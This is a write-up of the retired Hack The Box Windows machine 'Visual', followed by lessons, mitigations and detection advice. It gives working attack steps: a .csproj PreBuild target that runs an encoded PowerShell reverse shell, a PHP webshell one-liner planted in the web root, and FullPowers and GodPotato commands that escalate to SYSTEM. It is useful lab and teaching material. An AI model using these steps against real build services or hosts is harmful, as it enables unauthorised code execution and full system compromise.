---
machine: Visual
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, web, git, dotnet, fullpowers, godpotato, privesc]
---

# Visual — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site compiles Visual Studio projects submitted as Git URLs. The service clones the repository with `git`, lets the user choose a branch and runs `msbuild` on the `.sln`. A `.csproj` with a `PreBuildEvent` or a target using `BeforeTargets="PreBuildEvent"` executes commands during the build. Host a malicious .NET 6 project on a local Gitea and submit its URL; the PowerShell command returns a shell as `enox`. `enox` can write to `C:\xampp\htdocs`, so a PHP webshell runs as `NT AUTHORITY\LOCAL SERVICE`, with `SeImpersonate` disabled. `FullPowers` restores the service privileges and `GodPotato` uses them to gain `SYSTEM`.

## Recon

```bash
nmap -Pn -sCV -p80 <IP>
```

- `80` Apache 2.4.56 Win64, OpenSSL 1.1.1t, PHP 8.1.17.
- XAMPP; `uploads`, `assets`, `css`, `js` and `submit.php`.

The site accepts a repository URL. The server tries to clone it and shows status under `/uploads/<hash>/`; the project must contain a `.sln`.

## Enumeration

Submitting a URL under our control produces `GET /test/info/refs?service=git-upload-pack` with `User-Agent: git/2.41.0.windows.1`. The server uses Git over HTTP.

Start a local Gitea and create a test .NET 6 project. The site clones the repository, runs `msbuild` and returns the generated binaries under `/uploads/<hash>/`. `compile.ps1` in `enox`'s home confirms the process reads `C:\xampp\htdocs\uploads\todo.txt` and builds with `msbuild.exe`.

## Foothold

A Visual Studio project supports pre- and post-build events. Add to `.csproj`:

```xml
<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
  <Exec Command="powershell -e <BASE64_REVERSE_SHELL>" />
</Target>
```

`<PreBuildEvent>calc.exe</PreBuildEvent>` also works. Publish the repository to Gitea, submit its URL and, after the build, a shell arrives as `visual\enox`.

## Lateral movement

`enox` can write to `C:\xampp\htdocs`. Create a webshell with `Set-Content` (not `echo`, which writes UTF-16 and XAMPP will not execute):

```powershell
Set-Content -Path C:\xampp\htdocs\pwn.php -Value '<?php system($_REQUEST["cmd"]); ?>'
```

The webshell runs as `NT AUTHORITY\LOCAL SERVICE`. `whoami /priv` shows only `SeChangeNotify`, `SeCreateGlobal` and `SeIncreaseWorkingSet`; `SeImpersonate` is missing.

## Privilege escalation

`FullPowers.exe` creates a scheduled task as `LOCAL SERVICE` and recovers the full token, including `SeImpersonate`:

```powershell
.\FullPowers.exe -c "whoami /priv"
.\FullPowers.exe -c "powershell -e <BASE64_REVERSE_SHELL>"
```

The new shell has `SeImpersonate`, `SeAssignPrimaryToken` and `SeIncreaseQuota`. `GodPotato` abuses DCOM/RPC to impersonate a `SYSTEM` token:

```powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "powershell -e <BASE64_REVERSE_SHELL>"
```

The second command returns a shell as `NT AUTHORITY\SYSTEM`.

## Evidence

- `git-upload-pack` request to the attacker host.
- Repository cloned and built under `/uploads/<hash>/`.
- `.csproj` with `PreBuild`/`PreBuildEvent`.
- Shell as `visual\enox`.
- Webshell in `C:\xampp\htdocs` as `LOCAL SERVICE`.
- `FullPowers` showing `SeImpersonate` and `GodPotato` running `whoami` as `SYSTEM`.

## Lessons learned

- Compiling a user's code is code execution: MSBuild allows commands in events and targets.
- A service that clones repositories must treat the project as untrusted.
- `LOCAL SERVICE` may have a reduced token; `FullPowers` recovers service privileges.
- `SeImpersonate` remains a common bridge to `SYSTEM` on Windows.
- PowerShell encoding matters when writing PHP webshells.

## Mitigations and detection

- Do not build user projects on the host; use ephemeral containers without network or secrets.
- Block `Exec`, `PreBuildEvent` and `PostBuildEvent` in `.csproj` files or review the project before building.
- Run the build service as a low-privilege account with no webroot access.
- Apply least privilege to `LOCAL SERVICE` and monitor `FullPowers`, scheduled tasks and `GodPotato`.
- Detect `git-upload-pack` to external hosts, `msbuild` on new projects and webshells in `htdocs`.

## References

- [0xdf — Visual](https://0xdf.gitlab.io/2024/02/24/htb-visual.html)
- [IppSec — Visual](https://www.youtube.com/watch?v=ZJDefj0K9Jw)
- [Hack The Box — Visual](https://app.hackthebox.com/machines/visual)
